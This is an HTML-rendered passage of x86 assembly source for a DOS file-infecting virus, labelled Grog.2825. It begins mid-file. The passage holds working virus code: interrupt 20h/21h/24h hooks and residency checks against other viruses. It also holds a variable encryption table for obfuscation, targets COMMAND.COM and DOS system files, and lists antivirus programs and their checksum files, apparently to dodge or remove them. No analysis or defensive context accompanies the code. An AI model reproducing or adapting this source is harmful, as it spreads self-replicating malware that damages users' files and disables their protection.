         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">55aah</span><span class="sc0">        </span><span class="sc1">; Cascade/justice already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_invader</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4243h</span><span class="sc0">        </span><span class="sc1">; Invader function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_diamond</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to test_diamond</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5678h</span><span class="sc0">        </span><span class="sc1">; Invader already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_diamond</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0d5aah</span><span class="sc0">       </span><span class="sc1">; Diamond/dir function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_gotcha</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_gotcha</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2a55h</span><span class="sc0">        </span><span class="sc1">; Diamond already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_gotcha</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0dadah</span><span class="sc0">       </span><span class="sc1">; Gotcha function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">jmp_tst_func</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to jmp_tst_func</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc0">         </span><span class="sc1">; Gotcha already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">jmp_tst_func</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_functio</span><span class="sc0">

</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 24h of Grog.2825</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Fail system call in progress</span><span class="sc0">
</span><span class="sc5">int24_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">int20_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 20h of Grog.2825</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8e67h</span><span class="sc0">        </span><span class="sc1">; Grog.2825 function</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt offset 21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt segment 21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
</span><span class="sc5">int20_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">        </span><span class="sc1">; JMP imm32 (opcode 0eah)</span><span class="sc0">
</span><span class="sc5">int20_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 20h</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_simula</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Simulate interrupt 21h</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9ah</span><span class="sc0">         </span><span class="sc1">; CALL imm32 (opcode 9ah)</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">origin_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Offset of original code of infec...</span><span class="sc0">
</span><span class="sc5">stack_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack segment</span><span class="sc0">
</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack pointer</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Checksum</span><span class="sc0">
</span><span class="sc5">origin_ip</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original instruction pointer</span><span class="sc0">
</span><span class="sc5">origin_cs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original code segment</span><span class="sc0">
</span><span class="sc5">com_exe_ov</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; COM or EXE/Overlay executable</span><span class="sc0">
</span><span class="sc5">retro_struc</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; TbMem retro structures</span><span class="sc0">
</span><span class="sc5">tunnel_addr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">     </span><span class="sc1">; Address of tunneled interrupt</span><span class="sc0">
</span><span class="sc5">int13_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 13h</span><span class="sc0">
</span><span class="sc5">int21_addr_</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc0">     </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int40_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 40h</span><span class="sc0">
</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 01h</span><span class="sc0">
</span><span class="sc5">c__command_c</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C:\COMMAND.COM'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">c__dos_comma</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C:\DOS\COMMAND.COM'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">file_specifi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; File specification</span><span class="sc0">
</span><span class="sc5">table_begin</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IBMBIO'</span><span class="sc0">            </span><span class="sc1">; IBMBIO.COM</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IBMDOS'</span><span class="sc0">            </span><span class="sc1">; IBMDOS.COM</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SCAN  '</span><span class="sc0">            </span><span class="sc1">; McAfee ViruScan</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CLEAN '</span><span class="sc0">            </span><span class="sc1">;   "       "</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-PROT'</span><span class="sc0">            </span><span class="sc1">; F-PROT</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CPAV  '</span><span class="sc0">            </span><span class="sc1">; Central Point Anti-Virus</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MSAV  '</span><span class="sc0">            </span><span class="sc1">; Microsoft Anti-Virus</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NAV   '</span><span class="sc0">            </span><span class="sc1">; Norton Anti-Virus</span><span class="sc0">
</span><span class="sc5">table_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">table_begin_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption algorithm</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
</span><span class="sc5">table_end_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">anti_vir_dat</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; ThunderBYTE Anti-Virus CRC file</span><span class="sc0">
</span><span class="sc5">chklist__</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKLIST.*'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; Microsoft Anti-Virus/Central Poi...</span><span class="sc0">
</span><span class="sc5">_nav___no</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\NAV_._NO'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; Norton Anti-Virus CRC file</span><span class="sc0">
</span><span class="sc5">crypt_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sft_segment</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Segment of system file table</span><span class="sc0">
</span><span class="sc5">sft_offset</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of system file table</span><span class="sc0">
</span><span class="sc5">file_buffer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">command_inst</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Instance of COMMAND.COM already ...</span><span class="sc0">
</span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; Terminate program!</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b3d8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">data_buffer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1ea8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Used by DOS for find next-process</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File attribute</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Filesize</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Filename</span><span class="sc0">
</span><span class="sc5">data_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">      </span><span class="sc5">code_begin</span><span class="sc0">
</span></div></body>
</html>
